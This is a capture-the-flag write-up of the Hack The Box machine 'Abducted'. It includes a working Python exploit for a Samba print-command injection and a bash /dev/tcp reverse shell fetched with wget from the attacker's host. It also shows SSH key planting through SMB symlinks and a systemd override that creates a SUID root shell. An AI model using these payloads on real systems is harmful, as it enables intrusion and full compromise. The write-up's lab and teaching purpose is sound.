# HTB: ABDUCTED — Full Writeup

**Target:** 10.129.244.177
**Attacker:** 10.10.16.35
**Difficulty:** Medium
**OS:** Ubuntu 24.04 (Linux)
**User Flag:** `[REDACTED]`
**Root Flag:** `[REDACTED]`

---

## Attack Chain Summary

| Stage | Technique | Result |
|-------|-----------|--------|
| Foothold | CVE-2026-4480 — Samba `%J` print command injection | Shell as `nobody` |
| Credential | Rclone obscured password in `/opt/offsite-backup/rclone.conf` | `[REDACTED]` |
| Lateral → scott | Password reuse via SSH | Shell as `scott` |
| User Flag | `/home/scott/user.txt` | `[REDACTED]` |
| Lateral → marcus | SMB symlink abuse (`wide links` + `force user`) | SSH as `marcus` |
| Privesc → root | Systemd `smbd.service.d` override via `operators` group | SUID bash → root |
| Root Flag | `/root/root.txt` | `[REDACTED]` |

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -sV -sC -T4 -Pn --open 10.129.244.177
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu 24.04) |
| 139/tcp | NetBIOS-SSN | Samba smbd 4 |
| 445/tcp | SMB | Samba smbd 4 |

### SMB Enumeration

```bash
smbclient -N -L //10.129.244.177
```

| Share | Type | Comment |
|-------|------|---------|
| HP-Reception | Printer | Reception printer |
| projects | Disk | Hartley Group Project Files |
| transfer | Disk | Staff file transfer |
| IPC$ | IPC | Hartley Group Document Services |

### User Enumeration (via rpcclient)

```bash
rpcclient -U "" -N 10.129.244.177 -c "enumdomusers"
```

| UID | User | Notes |
|-----|------|-------|
| 1000 | scott | Samba + SSH user |
| 1001 | marcus | SSH-only user |

---

## 2. Foothold — CVE-2026-4480: Samba Print Command %J Injection

### Vulnerability Details

CVE-2026-4480 (CVSS 10.0) is an unauthenticated RCE in Samba's printing subsystem. When `print command` uses the `%J` substitution (job name), the client-supplied document name is passed to the shell without escaping metacharacters like `|`, `;`, `&`, `` ` ``, `$()`.

**Key requirements (all met on this box):**
- `printing = sysv` (non-CUPS backend)
- `print command` uses `%J` substitution
- Guest access to printer share enabled
- `disable spoolss = no`

The Samba config confirmed the vulnerable setup:

```ini
[HP-Reception]
   print command = /usr/local/bin/printaudit %J %s
   printable = yes
   guest ok = yes
```

### Understanding the Vulnerability (from the patch)

The vulnerable code in `source3/printing/print_generic.c`:

```c
// pjob->jobname comes from client's pDocName — UNSANITIZED
jobname = talloc_strdup(ctx, pjob->jobname);
jobname = talloc_string_sub(ctx, jobname, "'", "_");  // Only strips single quotes!

// Passed directly into a shell command:
ret = print_run_command(snum, ..., "%J", jobname, ...);
// print_run_command() → smbrun_no_sanitize() → SHELL EXECUTION
```

The fix (commit `c51b42f`) added `|&<>` to `STRING_SUB_UNSAFE_CHARACTERS`, and commit `b80131f` added proper masking and single-quoting of the job name.

### Exploit Script — `exploit_cve2026_4480.py`

The exploit uses impacket to connect to the spoolss RPC pipe anonymously, opens the printer, then submits a print job via `StartDocPrinter` (opnum 17) with a command-injected `pDocName`. When `EndDocPrinter` (opnum 23) is called, Samba's `generic_job_submit()` passes the unsanitized job name to `print_run_command()`, triggering shell execution.

```python
#!/usr/bin/env python3
"""CVE-2026-4480 - Samba print command %J injection via spoolss RPC.
Manually marshals StartDocPrinter (opnum 17), WritePrinter (opnum 19),
and EndDocPrinter (opnum 23) NDR since impacket doesn't implement them."""
import sys
import struct
import io
from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.rpcrt import DCERPCException

target = sys.argv[1]
payload = sys.argv[2]

print(f"[*] Target: {target}")
print(f"[*] Payload: {payload}")


def ndr_wstr(s):
    """Encode a null-terminated wchar string as NDR conformant varying array."""
    chars = s + '\x00'
    n = len(chars)
    encoded = chars.encode('utf-16-le')
    data = struct.pack('<III', n, 0, n)  # max_count, offset, actual_count
    data += encoded
    pad = (4 - (len(data) % 4)) % 4
    data += b'\x00' * pad
    return data


def build_startdocprinter(handle, doc_name, datatype='RAW'):
    """Build raw NDR for RpcStartDocPrinter (opnum 17).
    
    MS-RPRN 3.1.4.9.1:
      PRINTER_HANDLE hPrinter;
      DOC_INFO_CONTAINER { Level, union { DOC_INFO_1* } }
      DOC_INFO_1 { LPWSTR pDocName, pOutputFile, pDatatype }
    """
    buf = io.BytesIO()
    buf.write(handle)                         # Context handle (20 bytes)
    buf.write(struct.pack('<I', 1))           # Level = 1
    buf.write(struct.pack('<I', 1))           # Union discriminant = 1
    buf.write(struct.pack('<I', 0x20000))     # Unique ptr to DOC_INFO_1
    buf.write(struct.pack('<I', 0x20004))     # pDocName ptr (non-null)
    buf.write(struct.pack('<I', 0))           # pOutputFile ptr (null)
    buf.write(struct.pack('<I', 0x20008))     # pDatatype ptr (non-null)
    buf.write(ndr_wstr(doc_name))             # pDocName referent data
    buf.write(ndr_wstr(datatype))             # pDatatype referent data
    return buf.getvalue()


def build_writeprinter(handle, data):
    """Build raw NDR for RpcWritePrinter (opnum 19)."""
    buf = io.BytesIO()
    buf.write(handle)
    buf.write(struct.pack('<I', len(data)))   # Conformant array max_count
    buf.write(data)
    pad = (4 - (len(data) % 4)) % 4
    buf.write(b'\x00' * pad)
    buf.write(struct.pack('<I', len(data)))   # cbBuf parameter
    return buf.getvalue()


# --- Connect anonymously to spoolss ---
rpctransport = transport.SMBTransport(target, filename=r'\spoolss')
rpctransport.set_credentials('', '', '', '', '')

dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(rprn.MSRPC_UUID_RPRN)
print("[+] Bound to spoolss RPC")

# Open printer with PRINTER_ACCESS_USE
resp = rprn.hRpcOpenPrinter(dce, f'\\\\{target}\\HP-Reception',
                            accessRequired=rprn.PRINTER_ACCESS_USE)
handle = resp['pHandle']
print(f"[+] Opened printer handle")

# StartDocPrinter — inject payload into pDocName
ndr = build_startdocprinter(handle, payload)
print(f"[*] Sending StartDocPrinter (opnum 17)...")
dce.call(17, ndr)
raw = dce.recv()
if raw and len(raw) >= 4:
    job_id = struct.unpack('<I', raw[:4])[0]
    print(f"[+] JobId={job_id}")

# WritePrinter — send minimal data
print("[*] Sending WritePrinter (opnum 19)...")
dce.call(19, build_writeprinter(handle, b'X\n'))
dce.recv()

# EndDocPrinter — this triggers generic_job_submit() -> print_run_command()
print("[*] Sending EndDocPrinter (opnum 23)... [triggers injection]")
dce.call(23, handle)
try:
    dce.recv()
    print("[+] EndDocPrinter OK")
except Exception as e:
    print(f"[!] EndDocPrinter: {e}")

rprn.hRpcClosePrinter(dce, handle)
print("[+] Done")
```

### Exploitation Steps

**Step 1:** Create reverse shell script `shell.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.35/4444 0>&1
```

**Step 2:** Host the shell script:

```bash
cd /tmp
python3 -m http.server 9001 --bind 10.10.16.35
```

**Step 3:** Start listener:

```bash
nc -nlvp 4444
```

**Step 4:** Fire the exploit — download and execute the shell:

```bash
python3 exploit_cve2026_4480.py 10.129.244.177 \
  '|wget http://10.10.16.35:9001/shell.sh -O /tmp/s.sh && bash /tmp/s.sh #'
```

**Result:** Reverse shell as `nobody`.

---

## 3. Credential Discovery — Rclone Config

As `nobody`, enumerated the filesystem and found a cron job:

```bash
cat /etc/cron.d/offsite-backup
# 30 2 * * * root /opt/offsite-backup/sync.sh >/dev/null 2>&1

cat /opt/offsite-backup/sync.sh
# #!/bin/bash
# /usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects

cat /opt/offsite-backup/rclone.conf
# [offsite]
# type = sftp
# host = backup.hartley-group.internal
# user = svc-backup
# pass = [REDACTED]
```

Rclone passwords are obscured, not encrypted. Reveal with:

```bash
rclone obscure [REDACTED] --reveal
# [REDACTED]
```

---

## 4. Lateral Movement — scott (User Flag)

Password reuse confirmed with netexec:

```bash
nxc ssh 10.129.244.177 -u scott -p '[REDACTED]'
# [+] scott:[REDACTED]  Linux - Shell access!
```

```bash
ssh scott@10.129.244.177
# Password: [REDACTED]

cat ~/user.txt
# [REDACTED]
```

---

## 5. Lateral Movement — marcus (via SMB Symlink Abuse)

### Samba Config Analysis

```ini
# /etc/samba/shares.conf
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus        # <-- file operations execute as marcus
   wide links = yes           # <-- symlinks can point outside the share

# /etc/samba/smb.conf (global)
   allow insecure wide links = yes
```

When `scott` connects to the `transfer` share via SMB, all file operations are performed as `marcus` due to `force user`. Combined with `wide links = yes`, symlinks inside `/srv/transfer` that point to arbitrary filesystem paths are followed as `marcus`.

### Writing SSH Key for marcus

```bash
# As scott via SSH:
cd /srv/transfer
ln -s /home/marcus marcus_home
```

```bash
# From attacker — create .ssh dir and upload key via SMB:
ssh-keygen -t ed25519 -f /tmp/marcus_key -N ""
cp /tmp/marcus_key.pub /tmp/authorized_keys

smbclient //10.129.244.177/transfer -U scott%[REDACTED] \
  -c 'cd marcus_home; mkdir .ssh'
smbclient //10.129.244.177/transfer -U scott%[REDACTED] \
  -c 'cd marcus_home/.ssh; put /tmp/authorized_keys authorized_keys'
```

```bash
# Verify SSH access as marcus:
ssh -i /tmp/marcus_key marcus@10.129.244.177
# uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

---

## 6. Privilege Escalation — Root (Systemd Override)

### Discovery

```bash
grep marcus /etc/group
# operators:x:1000:marcus

find / -group operators 2>/dev/null
# /etc/systemd/system/smbd.service.d

ls -la /etc/systemd/system/smbd.service.d
# drwxrws--- 2 root operators 4096 ...
```

The `operators` group has write access to the systemd drop-in directory for the `smbd` service (with setgid bit). This allows marcus to create service overrides that execute as root when smbd is restarted.

### Exploitation

**Step 1:** Create the systemd override — `override.conf`:

```ini
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/rootbash
ExecStartPre=/bin/chmod 4755 /tmp/rootbash
```

**Step 2:** Upload via SMB symlink:

```bash
# As scott via SSH:
cd /srv/transfer
ln -s /etc/systemd/system/smbd.service.d smbd_override

# From attacker:
smbclient //10.129.244.177/transfer -U scott%[REDACTED] \
  -c 'cd smbd_override; put /tmp/override.conf override.conf'
```

**Step 3:** Reload systemd and restart smbd as marcus:

```bash
ssh -i /tmp/marcus_key marcus@10.129.244.177

# Unprivileged daemon-reload is allowed via polkit on Ubuntu:
systemctl daemon-reload

# Restart smbd — triggers ExecStartPre as root:
systemctl restart smbd
```

**Step 4:** Use the SUID bash:

```bash
# From scott's SSH session:
/tmp/rootbash -p

cat /root/root.txt
# [REDACTED]
```

---

## Key Samba Config (for reference)

```ini
# /etc/samba/smb.conf
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf

# /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

---

## Findings Summary

| # | Finding | Severity | Impact |
|---|---------|----------|--------|
| 1 | CVE-2026-4480 — pre-auth RCE via `%J` injection in Samba print command | Critical | Full system compromise from unauthenticated position |
| 2 | Cleartext (obscured) credentials in rclone backup config | High | Password reuse across services |
| 3 | SMB `wide links` + `force user` allows cross-user file access | High | Arbitrary file read/write as another user |
| 4 | Writable systemd service override directory for unprivileged group | Critical | Privilege escalation to root |
| 5 | Anonymous SMB share listing and guest printer access | Medium | Attack surface exposure |
| 6 | Weak password policy (min 5, no complexity) | Low | Facilitates credential attacks |
